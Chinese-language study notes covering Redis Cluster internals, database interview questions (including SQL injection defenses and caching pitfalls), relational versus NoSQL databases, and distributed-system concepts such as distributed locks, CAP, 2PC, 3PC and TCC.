#### CLUSTER MEET命令实现

通过向节点A发送`CLUSTER MEET <ip> <port>`命令，客户端可以让接收命令的节点A将另一个节点B添加到集群里

收到命令的节点A将与节点B进行握手，来确认彼此存在：

- 节点A为B创建一个`clusterNode`结构，并添加到自己的`clusterState.node`字典里
- 节点A根据命令给出的ip和port，向节点B发送一条MEET消息
- 节点B收到节点A发送的MEET消息，节点B会为节点A创建一个`clusterNode`结构，并添加到自己的集群节点字典中
- 之后节点B向A返回一条PONG消息
- A收到B发送的PONG消息，向B发送一条PING消息
- B收到A发送的PING消息，B知道A成功收到自己的PONG消息，握手完成

之后，节点A通过Gossip协议将节点B的信息传播给集群中的其他节点，让其他节点与节点B握手，经过一段时间，节点B会被集群中的所有节点认识。

### 槽指派

Redis集群通过分片的方式来保存数据库中的键值时：集群的整个数据库被分为16384(2^14)个槽（slot），数据库中的每个键都属于这16384个槽中的其中一个，集群中的每个节点可以处理0或者16384个槽。（因为传输节点数据时用到了位图存储，一次大约2K，心跳包适中）

当数据库中的16384个槽都有节点在处理时，集群处于上线状态（OK）；相反如果有任何一个或者多个没有节点处理，就处于下线状态（fail）。

通过`CLUSTER ADDSLOTS`命令，可以将一个或者多个槽指派给节点负责。

`clusterNode`结构中的`slots`和`numslot`属性记录了节点负责处理哪些槽。其中`slots`数组记录的二进制位信息，大小为16384/8。

节点除了会将自己负责的槽记录在属性中之外，海会将自己的`slots`数组通过消息发送给集群中的其他节点，以此来告诉其他节点自己目前负责处理哪些槽。其他节点根据这些信息更新保存的其他节点结构中的`slots`属性。

`clusterState`结构中的`slots`数组记录了每个槽的指派信息，大小为16384。

执行`CLUSTER ADDSLOTS`命令中，需要先检查所有输入槽是否都处于未指派状态，然后再对他们进行指派操作。

### 集群中执行命令

在对数据库的16384个节点进行指派之后，集群就处于上线状态，当客户端向节点发送与数据库键有关的命令时，接收命令的节点计算要处理的键属于哪个槽`CRC16(key)&16383`，并检查该槽是否指派给了自己：

- 如果该槽指派给了当前节点，那么该节点直接执行该命令
- 如果没有指派给当前节点，那么节点向客户端返回一个`MOVED`错误，指引客户端转向正确的节点，并向正确的节点再次发送命令。

节点和单机服务器在数据库方面的一个区别是：节点只能使用0号数据库，单机没有这个限制。

除了将键值对保存在数据库里之外，节点还会用`clusterState`结构中的`slots_to_keys`**rax树结构**保存槽和键之间的关系。

### 重新分片

Redis集群的重新分片操作可以将任意数量已经指派给某个节点的槽改为指派给另一个节点，并且相关槽所属的键值对也会转到另一个节点。

重新分片操作是通过Redis的集群管理软件`redis-trib`负责执行的，Redis提供了进行重新分片所需的所有指令，而`redis-trib`则通过向源节点和目标节点发送命令来进行重新分片操作。

主要步骤为：

- `redis-trib`对目标节点发送`CLUSTER SETSLOT <slot> IMPORTING <source_id>`命令，让目标节点准备好导入属于槽slot的键值对。
- `redis-trib`对源节点发送`CLUSTER SETSLOT <slot> MIGRATING <target_id>`命令，让源节点准备好迁移（migrating）slot键值对到目标节点。
- `redis-trib`对目标节点发送`CLUSTER GETKEYSINSLOT <slot> <count>`命令，获得最多count个属于槽slot的键值对的键名。
- 对于上个步骤获得的每个键名，`redis-trib`都向源节点发送`MIGRATE <target_ip> <target_port> <key_name> 0 <timeout>`，将被选中的键原子的从源节点迁移到目标节点。
- 重复执行上述步骤，直到所有键值对迁移完成。
- `redis-trib`向集群中任意一个节点发送`CLUSTER SETSLOT <slot> NODE <target_id>`命令，将槽id指派给目标节点，最终整个集群都会知道。

#### ASK错误

在重新分片过程中，可能存在部分键值对保存在源节点中，另一部分在目标节点。此时仓客户端发送一个与数据库键有关的命令，并且命令要处理的数据库键恰好属于正在被迁移的槽（保存在`clusterNOde *migrating_slots_to[16384]`中）时：

- 源节点首先在自己数据库中查找指定的键，如果找到就返回给客户端
- 如果没有找到，那么这个键有可能被迁移到了目标节点中，源节点向客户端返回一个ASK错误，指引客户端转向目标节点查找。

#### ASK错误和MOVED错误的区别

两者都会导致客户端转向

- MOVED错误标识槽的负责权已经从一个节点转移到另一个节点，永久性重定向
- ASK错误是迁移槽过程中使用的一种临时措施，客户端收到该错误之后，会在下一次命令请求中将其发送到该错误所指定的节点上，之后还是发到当前节点上

### 复制和故障转移

Redis集群中由多个节点组成，主节点负责进行处理槽，每个主节点还可以有多个从节点，用于复制主节点，达到高可用的目的。

当发生主节点掉线后，集群自动从该主节点的从节点中选择一个作为主节点处理相应的槽。

- 设置从节点
  - 向一个节点发送`CLUSTER REPLICATE <node_id>`将其变为指定节点的从节点，并对其进行复制
  - 接收到该命令的节点首先在自己的`clusterState.nodes`字典中找到`node_id`所对应节点的`clusterNode`结构，并将自己的`clusterState.myself.slaveof`指针指向这个结构，以此来记录这个节点正在复制的主节点。
  - 修改`clusterState.myself.flags`中的属性，关闭`REIDS_NODE_MASTER`，打开`REDIS_NODE_SLAVE`，表示该节点已经变为从节点
  - 最后，节点调用复制代码，根据第二步保存的主节点信息对齐进行复制，相当于向从节点发送命令`SLAVEOF <master_ip> <master_port>`
  - 当一个节点成为从节点并开始复制某个主节点后，这一信息会发送给集群内所有节点，集群中的所有节点更新该主节点结构体（`nodes值`）中的`slaves`和`numslaves`属性。
- 故障检测
  - 集群中的每个节点都会定期向集群中的其他节点发送PING消息，以此来检测对象是否在线，如果接收PING消息的节点在规定时间内没有返回PONG消息，将其标记为疑似下线。
  - 集群中的各个节点还会通过互相发送消息的方式来交换集群中各个节点的状态信息，比如`ONLINE, PFAIL, FAIL`
  - 所有收到某主节点疑似下线信息的节点将该信息保存到某节点结构体中的`fail_reports`链表中。
  - 如果一个集群里面半数负责处理槽的主节点都将某个主节点x报告为疑似下线，那么这个主节点x就会被标记为下线，同时将该信息广播给集群内其他节点，其他收到该信息的节点立即将主节点x标记为下线。
- 故障转移
  - 当一个从节点发现自己正在复制的主节点进入了下线状态，从节点开始对下线主节点进行故障转移：
    - 选中一个从节点执行`SLAVEOF no one`，成为新的主节点
    - 新的主节点会撤销所有对已下线主节点的槽指派，并将槽全部分配给自己
    - 新的主节点向集群广播一条PONG消息，让其他节点知道该节点已转变为主节点
    - 该新主节点开始处理命令请求。

### 消息

集群中的各个节点通过发送和接收消息（message）来进行通信，消息由消息头和消息体组成，消息主要包括以下5种：

- `MEET`消息：连接节点，使节点加入到集群中
- `PING`消息：每1秒钟随机从已知节点列表中选出5个，对这5个节点最长没有发送过PING消息的节点发送PING消息，检测被选中阶段是否在线；除此之外，如果节点A最后一次收到节点B发送的PONG消息的时间，距离当前时间已经超过了节点A的`cluster-node-timeout`选项设置时长的一半，那么节点A也会向节点B发送PING消息。
- `PONG`消息：收到PING消息后返回PONG消息；另外，一个节点也可以通过广播自己的PONG消息来让集群中的其他节点立即刷新关于该节点的认知
- `FAIL`消息：当一个主节点A判断另一个节点B进入FAIL状态，节点A向集群广播一条关于B的FAIL消息
- `PUBLISH`消息：当节点收到一个PUBLISH命令，节点会执行这个命令，并向集群广播一条PUBLISH消息，所有收到这条消息的节点都执行相同的PUBLISH命令。

## 布隆过滤器



# 数据库之常见面试题

## 主键索引和唯一索引的区别

- 主键是一种约束，而唯一索引是一种索引，两者在本质上不同的
- 主键创建后一定包含一个唯一性索引，唯一性索引不一定就是主键
- 主键列不允许空值，唯一性索引允许空值
- 主键列在创建时，已经默认为非空值+唯一索引了
- 一个表最多只能创建一个主键，但是可以创建多个唯一性索引
- 主键更适合那些不容易改变的唯一标识，比如自动递增列，身份证号等

## SQL中各种JOIN的区别

### INNER JOIN

内连接是最常见的一种连接，也被称为普通连接，之链接匹配的行。它又分为等值连接（=）和不等值连接（between...and...）。

### OUTER JOIN

#### FULL OUTER JOIN

包含左，右两个表的全部行，不管另一边的表中是否存在与他们匹配的行

#### LEFT OUTER JOIN

包含左边表的全部行（不管右边是否存在与他们匹配的行），以及右边表中全部匹配的行

#### RIGHT OUTER JOIN

包含右边表的全部行，以及左边表中全部匹配的行

### CROSS JOIN

笛卡尔乘积（所有可能的行对），交叉连接用于对两个源表进行纯关系代数的乘运算，它不使用连接条件来限制结果集合，而是将分别来自两个数据源中的行以所有可能的方式进行组合。

### NATURAL JOIN

自然连接是一种特殊的等值连接，它要求两个关系中进行比较的分量必须是相同的属性组，并且在结果中**把重复的属性列去掉**；而等值连接不会去掉重复的属性列。

#### NATURAL LEFT JOIN

左自然连接，保留2个表的列（删除重复列），以左表为准，不存在匹配的右表列，值置为NULL

### SELF JOIN

某个表和其自身连接，连接方式可以为内连接，外连接，交叉连接

## 数据库连接池

基本思想：为数据库连接建立一个“缓冲池”，预先在池中放入一定数量的数据库连接管道，需要时从池子中取出管道进行使用，操作完毕后，再讲管道放入池子中，从而避免了频繁的向数据库中申请和释放资源带来的性能损耗。

### 优点

- **资源重用：**由于数据库连接得到重用，避免了频繁创建、释放连接引起的大量性能开销。在减少系统消耗的基础上，增加了系统环境的平稳性（减少内存碎片以及数据库临时进程、线程的数量）
- **更快的系统响应速度：**数据库连接池在初始化过程中，往往已经创建了若干数据库连接置于池内备用。此时连接池的初始化操作均已完成。对于业务请求处理而言，直接利用现有可用连接，避免了数据库连接初始化和释放过程的时间开销，从而缩减了系统整体响应时间。
- **新的资源分配手段**：对于多应用共享同一数据库的系统而言，可在应用层通过数据库连接的配置，实现数据库连接技术。
- **统一的连接管理，避免数据库连接泄露**：在较为完备的数据库连接池实现中，可根据预先的连接占用超时设定，强制收回被占用的连接，从而避免了常规数据库连接操作中可能出现的资源泄露

## MySQL的表空间方式

MySQL没有真正意义上的表空间管理。MySQL的InnoDB包含两种表空间文件模式，默认的共享表空间和每个表分离的独立表空间。

在`my.cnf`中添加`innodb_file_per_table=1`可以从共享表空间切换到独立表空间。

### 共享表空间方式

默认的表空间方式。相对而言所有的数据都在一个（或几个）文件中，比较利于管理，而且在操作的时候只需要open这一个（或几个）文件即可，相对来说代价很低。

## 缓存问题

正常的使用缓存的流程为，数据查询先进行缓存查询，如果key不存在或者key已经过期，再对数据库进行查询，并且把查询到的对象放进缓存，如果数据库查询对象为空，则不放进缓存。

### 缓存穿透

缓存穿透指查询一个数据库一定不存在的数据。比如发起id为'-1'的数据或者id特别大不存在的数据，这时的用户可能是攻击者，攻击会导致数据库压力过大。

#### 解决方案

- 接口层增加校验，比如用户鉴权校验，id做基础校验，id<=0的直接拦截
- 缓存取不到的数据，将key-value对写成key-null并放入缓存中，缓存有效时间设置短一点，比如30s，这样可以防止攻击用户反复用同一个id暴力攻击。

### 缓存击穿

缓存击穿是指缓存中没有但是数据库中有的数据（一般指缓存时间到期），这时由于并发用户很多，同时读缓存没读到数据，又同时去数据库读取数据，引起数据库压力瞬间增大，造成过大压力。

#### 解决方案

- 设置热点数据永不过期
- 加互斥锁，这样在第一个进行查询的时候，其他查询无法到达数据库，当第一个查询结束之后，缓存中已经有了该数据。

### 缓存雪崩

缓存雪崩是指缓存中数据有大批量到过期时间，而查询数据量巨大，引起数据库压力多大甚至宕机。和缓存击穿不同的是，缓存击穿指并发查一条数据，缓存雪崩是指不同数据同时都过期了，进而都去查询数据库。

#### 解决方案

- 将缓存数据的过期时间设置随机，防止同一时间内大量数据同时过期。
- 如果缓存数据库是分布式部署，将热点数据均匀分布在不同的缓存数据库中，防止因为一台缓存服务器宕机导致的缓存雪崩
- 设置热点数据永不过期

### SQL注入

通过SQL语句，实现无账号登陆，甚至篡改数据库。主要原因是程序员可能在开发用户和数据库交互的系统时没有对用户输入的字符串进行过滤，转义，限制或者处理不严谨，导致用户可以通过精心构造的字符串去非法获取数据库中的数据。

#### 解决方案

- 检查变量数据类型和格式：只要有固定格式的变量，在SQL语句执行前，应该严格按照格式去检查，确保变量是我们预想的格式，这在很大程度上可以避免SQL注入
- 过滤特殊符号：对于无法确定固定格式的变量，进行特殊符号过滤或者转义处理
- 绑定变量，使用预编译语句：将一些常用的语句中的值用占位符替代，可以视为将sql语句模板化或者参数化。优势在于：一次编译，多次运行，省去了解析优化等过程；此外预编译可以防止sql注入。

### 独立表空间方式

相对而言对立表空间每个表都有独立的多个数据文件，而且做到了索引和数据的分离。多个小文件之间很方便的完成跨数据库甚至跨硬件的数据拷贝和迁移。相对来说灵活性很好。

## 一条SQL语句执行很慢的原因

- 当MySQL执行的任务比较多的时候，例如IO操作、脏页较多等，那么可能导致MySQL的这些后台线程执行缓慢
- 当缓冲池、重做日志缓冲不够用时，或者存储空间变小时，也会是导致MySQL执行慢的原因
- MySQL对数据的访问实惠加锁的，因此当你的SQL语句设计到一张表时，如果这条数据被别的事务加锁了，那你就就必须等到锁的释放，因此这也可能是一种因素
- 没有加索引或者mysql没有使用你的索引  
  - 下面我们想要查询id为999的学生信息，但是由于=运算符的左边是999了，而不是id了，因此索引不会被使用到
  - **select** * **from** student **where** **id** - 1 = 1000;

## 使用Redis做异步队列

一般使用list结构作为队列，rpush生产消息，lpop消费消息。当lpop没有消息的时候，要适当sleep一会再重试。

**如果对方追问可不可以不用sleep呢？**list还有个指令叫blpop，在没有消息的时候，它会阻塞住直到消息到来。

**如果对方追问能不能生产一次消费多次呢？**使用pub/sub主题订阅者模式，可以实现1:N的消息队列。

**如果对方追问pub/sub有什么缺点？**在消费者下线的情况下，生产的消息会丢失，得使用专业的消息队列如rabbitmq等。

**如果对方追问redis如何实现延时队列？**我估计现在你很想把面试官一棒打死如果你手上有一根棒球棍的话，怎么问的这么详细。但是你很克制，然后神态自若的回答道：使用sortedset，拿时间戳作为score，消息内容作为key调用zadd来生产消息，消费者用zrangebyscore指令获取N秒之前的数据轮询进行处理。

## 海量Redis数据

**假如Redis里面有1亿个key，其中有10w个key是以某个固定的已知的前缀开头的，如果将它们全部找出来？**

使用keys指令可以扫出指定模式的key列表。

**对方接着追问：如果这个redis正在给线上的业务提供服务，那使用keys指令会有什么问题？**

这个时候你要回答redis关键的一个特性：redis的单线程的。keys指令会导致线程阻塞一段时间，线上服务会停顿，直到指令执行完毕，服务才能恢复。这个时候可以使用scan指令，scan指令可以无阻塞的提取出指定模式的key列表，但是会有一定的重复概率，在客户端做一次去重就可以了，但是整体所花费的时间会比直接用keys指令长。

# 关系型和非关系型数据库

## 关系型数据库

指采用了关系模型来组织数据的数据库。关系模型指的是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织。数据库事务必须具备ACID特性。

- 关系：一张二维表，每个关系都具有一个关系名，也就是表名
- 元组：二维表中的一行，在数据库中被称为记录
- 属性：二维表中的一列，在数据库中称为字段
- 域：属性的取值范围，也就是数据库中某一列的取值限制
- 关键字：一组可以唯一标识元组的属性，数据库中常称为主键，由一个或者多个列组成
- 关系模型：指对关系的描述。格式为：`关系名(属性1，属性2，...属性N)`，在数据库中称为表结构

**主要有：MySQL，Oracle，SQLite，MariaDB，SQL server等**

### 关系型数据库优点

- 容易理解：二维表结构是非常贴近逻辑世界的一个概念，关系模型相对网状、层次等其他模型来说更容易理解
- 使用方便：通用的SQL语言使得操作关系型数据库非常方便
- 易于维护：丰富的完整性（实体完整性，参照完整性和用户定义的完整性）大大降低了数据冗余和数据不一致的概率

### 关系型数据库缺点

- 网站的用户并发非常高，往往达到每秒上万次读写请求，对于传统关系型数据库来说，硬盘IO是一个很大的瓶颈
- 网站每天产生的数据量是巨大的，对于关系型数据库来说，在一张包含海量数据的表中查询，效率很低
- 表结构固定，灵活性欠佳
- 在基于web的结构中，数据库是最难进行横向扩展的，当一个应用系统的用户量和访问量与日俱增的时候，数据库没法像`web server`和`app server`那样简单的通过添加更多的硬件和服务节点来扩展性能和负载能力。当需要对数据库系统进行升级或者扩展的时候，通常需要停机维护和数据迁移。
- 性能欠佳：在关系型数据库中，导致性能欠佳的主要原因是多表的关联查询，以及复杂的数据分析类型的复杂的sql报表查询。为了保证数据库的ACID原则，必须尽量按照其要求的范式进行设计，关系型数据库中的表都是存储一个格式化的数据结构。

## 非关系型数据库

NoSQL（Not Only SQL）指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。

非关系型数据库以键值对存储，且结构不固定，每个元组可以有不一样的字段，每个元组可以根据需要增加一些自己的键值对，不局限于固定的结构，可以减少一些时间和空间的开销。

非关系型数据库严格上不是一种数据库，应该是一种数据机构话存储方法的集合，可以是文档或者键值对等。

- 方便扩展（数据之间没有关系，很好扩展）
- 大数据量高性能（Redis一秒可以写8万次，读11万次，NoSQL的缓存记录级是一种细粒度的缓存，性能比较高）
- 数据类型多样（不需要事先设计数据表，随取随用，如果是数据量十分大的表则无法设计）

### 四大分类

- **key-value键值对型**
  - Redis，Oracle BDB
  - 典型应用场景：内容缓存，主要用于处理大量数据的高访问负载，也用于一些日志系统等
  - 数据模型：Key指向Value的键值对，通常用Hash Table来实现
  - 优点：查找速度快
  - 缺点：数据无结构化，通常只被当作字符串或者二进制数据
- **文档型数据库（bson格式）**
  - MongoDB
    - 是一个基于分布式文件存储的数据库，主要涌过来处理大量的文档
    - 是一个介于关系型数据库和非关系型数据库中间的产品；是非关系型数据库中功能最丰富、最像关系型数据库的。
  - 典型应用场景：web应用（与key-value类似，value是结构化的，不同的是数据库能够了解value的内容）
  - 数据模型：key-value对应的键值对，value为结构化数据
  - 优点：数据结构要求不严格，表结构可以变化，不需要像关系型数据库一样需要预先定义表结构
  - 缺点：查询性能不高，而且缺乏统一的查询语法
- **列存储数据库**
  - HBase
  - 典型应用场景：分布式文件系统
  - 数据模型：以列簇式存储，将同一列数据存在一起
  - 优点：查找速度快，可扩展性强，更容易进行分布式扩展
  - 缺点：功能相对有限
- **图关系数据库**
  - Neo4J，InfoGrid，不是存储图形的，存放的是关系，比如朋友圈社交网络，广告推荐
  - 典型应用场景：社交网络，推荐系统等。专注于构建关系图谱
  - 数据结构：图结构
  - 优点：利用图结构相关算法。比如最短路径寻址，N度关系查找等
  - 缺点：很多时候需要对整个图做计算才能得到需要的信息，而却这种结构不太好做分布式的集群方案。

### 非关系型数据库优点

- 用户可以根据需要添加自己需要的字段，为了获取用户的不同信息，不像关系型数据库中要对多表进行关联查询。仅需要根据ID取出相应的value就可以完成查询。
- 适用于`SNS(Social Network Services)`中，例如社交网站。系统的升级，功能的增加往往意味着数据结构巨大变动，这一点关系型数据库难以应付，需要新的结构化数据存储。由于不可能用一种数据结构化存储应付所有的新的需求，因此，非关系型数据库严格上不是一种数据库，应该是一种数据机构话存储方法的集合。

### 非关系型数据库缺点

- 只适合存储一些较为简单的数据，对于需要进行较复杂查询的数据，关系型数据库更合适。不适合持久存储海量数据。
- 没有强大的事务关系，没有保证数据的完整性和安全性

# Nginx

`Nginx` 是一个 **免费的**，**开源的**，**高性能** 的 `HTTP` 服务器和 **反向代理**，以及 `IMAP` / `POP3` 代理服务器。 `Nginx` 以其高性能，稳定性，丰富的功能，简单的配置和低资源消耗而闻名。`Nginx`是一个 `Web` 服务器，也可以用作 **反向代理**，**负载均衡器** 和 `HTTP` **缓存**。




# 系统设计

## 系统设计基础

### 性能

#### 性能指标

- 响应时间：指某个请求从发出到接收到响应消耗的时间
  - 在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。
- 吞吐量（QPS）：指系统在单位时间内可以处理的请求数量，通常适用每秒的请求数来衡量
- 并发用户数：指系统能同时处理的并发用户请求数量。
  - 在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。
  - 目前的大型系统都支持多线程处理并发情况，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：
    - 多CPU
    - IO等待时间
  - 适用IO多路复用等方式，系统在等待一个IO操作完成的这段时间内不需要被阻塞，可以去处理其他请求。通过将这个等待时间利用起来，使得CPU利用率大大提高。
  - 并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大增加。

#### 性能优化

- 集群：将多台服务器组成集群，适用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。
- 缓存：缓存也可以提高性能，主要是因为
  - 缓存数据通常位于内存等介质中，这种介质对于读操作特别快
  - 缓存数据可以位于靠近用户的地理位置上
  - 可以将计算结果进行缓存，从而避免重复计算
- 异步：某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。

### 伸缩性

指不断向集群中添加服务器来缓解不但上升的用户并发访问压力和不断增长的数据存储需求。

#### 伸缩性和性能

如果系统存在性能问题，那么单个用户的请求总是很慢的；

如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。

#### 实现伸缩性

应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。

关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。

对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。

### 扩展性

指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。

实现可扩展主要有两种方式：

- 使用消息队列进行解耦，应用之间通过消息传递进行通信；
- 使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。

### 可用性

#### 冗余

保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。

应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。

存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。

#### 监控

对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个信息达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。

#### 服务降级

服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。

### 安全性

要求系统在应对各种攻击手段时能够有可靠的应对措施。

## 分布式

### 分布式锁

在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。

阻塞锁通常使用互斥量来实现：

- 互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；
- 互斥量为 1 表示未锁定状态。

1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。

#### 使用数据库的唯一索引实现

获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否处于锁定状态。

存在以下几个问题：

- 锁没有失效时间，解锁失败的话其他进程无法再获得该锁
- 只能是非阻塞锁，插入失败直接就报错了，无法重试；可以在程序中循环检测来解决
- 不可重入，已经获得锁的进程也必须重新获取锁

#### 基于缓存（Redis）实现

```
set resource_name random_value EX expire_time NX;
```

该命令仅在锁不存在时才可以设置（NX），到期时间为`expire_time`。

锁的value被设置为`random_value`，该值必须再所有客户端和所有锁定请求中都是唯一的。设定随机值是为了以安全的方式释放锁，也就是当锁存在并且锁里存储的值和我的一致时才可以删除该锁。可以通过Lua脚本实现原子操作：

```lua
if redis.call("get", KEYS[1]) == ARGV[1] then
	return redis.call("del", KEYS[1])
else
	return 0
end
```

同时该分布式锁无法解决超时的问题，如果在加锁和释放锁之间的逻辑执行太长，以至于超出了锁的超时限制，就会出现问题：因为这时候锁过期了，其他的线程会持有这个锁，为了避免这个问题，Redis分布式锁不要用于较长时间的任务，也可以设置一个看门狗，根据客户端持有锁的状态动态增长过期时间。

对于集群环境下的分布式锁，主节点挂掉后，从节点取而代之，但如果没有及时同步，会导致当另一个客户端过来请求加锁时，立即就批准了，这样会导致系统中同样一把锁被两个客户端同时持有，不安全性由此产生。不过这种情况也仅仅是在主从节点发生failover的情况下才会发生，而且持续时间很短，业务系统多数情况下可以容忍。

**RedLock算法**：使用多个Redis实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。

- 尝试从N个互相独立Redis实例获取锁；
- 计算获取锁消耗的时间，如果时间小于锁的过期时间，并且从大多数(N/2+1)实例上获取了锁，才认为获取成功。
- 如果获取锁失败，就到每个实例上释放锁

### 分布式事务

分布式事务就是指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的**分布式系统的不同节点**之上。

简单的说就是一次大的操作由不同的小操作组成，这些小的操作分布在不同的服务器上，且属于不同的应用，分布式事务需要保证这些小操作要么全部成功，要么全部失败。本质上来说，分布式事务就是为了保证不同数据库的数据一致性。

#### CAP原则

CAP原则又称为CAP定理，指的是在一个分布式系统中，web服务无法同时满足以下3个特性：

- 一致性（Consistency）：在分布式系统中数据一更新，所有数据变动都是同步的
- 可用性（Availability）：好的响应性能，每个操作都必须有预期的响应结束
- 分区容错性（Partition Tolerance）：在网络分区的情况下，即使出现单个节点无法使用（即节点间通信失败），系统依然正常对外提供服务。

**单机版的Redis中，牺牲的是A可用性，保证了C一致性和P分区容错性。因为宕掉的一台Master节点无法服务了。**

**Cluster功能的Redis牺牲的是C，保证了A可用性和P分区容错性。因为某个节点宕机，那么会有其他节点顶替上来，保证了A，但是无法保证C了。**

在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此CAP理论实际上是在可用性和一致性之间做权衡。

可用性和一致性往往是冲突的，很难使他们同时满足。在多个节点之间进行数据同步时：

- 为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用行
- 为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致

#### BASE理论

BASE理论是对CAP中的一致性和可用性进行一个权衡的结果，理论的核心思想是：我们无法做到强一致，但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性。

- 基本可用（Basically Available）
  - 指分布式系统在出现不可预知的故障的时候，允许损失部分可用性（不等价于系统不可用）
- 软状态（Soft State）
  - 和硬状态对应，是指允许系统中的数据存在中间状态，并认为该中间状态的存在不会影响系统的整体可用性，即允许系统的不同节点的数据副本之间进行数据同步的过程存在延时
- 最终一致性（Eventually Consistent）
  - 指的是系统所有的数据副本，经过一段时间的同步之后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要试试保证系统数据的强一致性。

#### 两阶段提交（2PC）

两阶段提交需要有一个协调者，来协调两个操作之间的操作流程。当参与方很多时，逻辑会变得比较复杂。

参与方需要实现两阶段提交协议。

##### 阶段1

- 协调者向所有参与者发送事务内容，询问是否可以提交事务并等待答复
- 各参与者执行事务操作，将undo和redo信息记入日志文件中
- 如果参与者执行成功，给协调者返回yes，否则返回no

##### 阶段2

- 如果协调者收到参与者的失败消息或者超时，直接给每个参与者发送回滚rollback消息，否则发送提交commit消息。

可能遇到的情况：

- 当所有参与者都反馈yes就提交事务
- 当有一个参与者反馈no，回滚事务

##### 问题

- 性能问题：所有参与者在事务提交阶段处于同步阻塞状态，占用系统资源，容易导致性能瓶颈
- 可靠性问题：如果协调者存在单点故障问题，或者出现故障，提供者将一直处于锁定状态
- 数据一致性问题：在第二个阶段中，如果出现协调者和参与者都挂了的情况，有可能导致数据不一致。

##### 优点

- 尽量保证了数据的强一致，适合对数据强一致要求很高的关键领域。

##### 缺点

- 实现复杂，牺牲了可用性，对性能影响大，不适合高并发场景

#### 三阶段提交（3PC）

二阶段提交的改进版本，要解决的是协调者和参与者同时挂的问题，3PC把2PC的准备阶段再次一分为二，变成三阶段提交。

##### 阶段1

- 协调者向所有参与者发出包含事务内容的canCommit请求，询问是否可以提交事务，并等待所有参与者答复。
- 参与者收到canCommit请求，如果认为可以执行事务操作，则反馈yes并进入预备状态，否则反馈no

##### 阶段2

- 如果所有参与者返回yes，协调者预执行事务
  - 协调者向所有参与者发出preCommit请求，进入准备阶段
  - 参与者收到preCommit请求后，执行事务操作，将undo和redo信息记入事务日志中（但不提交事务）
  - 各参与者向协调者反馈ack响应或者no响应，并等待最终指令
- 如果有参与者反馈no，或者等待超时后协调者无法收到所有参与者的反馈，即中断事务
  - 协调者向所有参与者发出abort请求
  - 无论收到协调者的abort请求，或者在等待协调者请求过程中出现超时，参与者都会中断事务

##### 阶段3

- 如果所有参与者均回馈ack响应，执行真正的事务提交
  - 如果协调者处于工作状态，则向所有参与者发出doCommit请求
  - 参与者收到doCommit请求后，会正式执行事务提交，并释放整个事务期间占用的资源
  - 各参与者向协调者反馈ack完成的消息
  - 协调者收到所有参与者反馈的消息后，即完成事务提交
- 如果有参与者反馈no，或者等待超时后协调者无法收到所有参与者的反馈，即回滚事务
  - 如果协调者处于工作状态，则向所有参与者发送rollback请求
  - 参与者使用阶段1中的undo信息执行回滚操作，并释放整个事务期间占用的资源
  - 各参与者向协调者反馈ack完成的消息
  - 协调者收到所有参与者反馈的消息后，即完成回滚操作
- 注意：进入阶段3后，无论协调者是否出问题，或者协调者与参与者网络出现问题，都会导致参与者无法接收到协调者发出的doCommit请求或者abort请求，**此时参与者都在等待超时之后，自动执行事务提交。**

##### 优点：

- 相比二阶段提交，三阶段提交降低了阻塞范围，在等待超时后协调者或参与者会中断事务。避免了协调者单点问题。阶段3中协调者出现问题时，参与者会继续提交事务。

##### 缺点：

- 数据不一致的问题依然存在，当在参与者收到preCommit请求后等待doCommit指令时，此时如果协调者请求中断事务，而协调者无法与参与者正常通信，会导致参与者继续提交事务，造成数据不一致。

#### 补偿事务（TCC）

TCC是服务化的二阶段编程模型，采用的补偿机制。核心思想是：针对每个操作，都要注册一个与其对应的确认和补偿操作。分为三个阶段：

- Try阶段主要是对业务系统做检测和资源预留
  - 完成所有业务检查（一致性）
  - 预留必须业务资源（准隔离性）
  - Try尝试执行业务
- Confirm阶段主要对业务系统做确认提交。
  - Try阶段执行成功并开始执行Confirm阶段时，默认Confirm阶段是不会出错的。即只要Try成功，Confirm一定成功。
- Cancel阶段主要是在业务执行错误，需要回滚的状态下执行的业务取消，预留资源释放。

##### 优点：

- 性能提升：具体业务来实现控制资源锁的粒度变小，不会锁定整个资源
- 数据最终一致性：基于Confirm和Cancel的幂等性，保证事务最终完成确认或者取消，保证数据的一致性
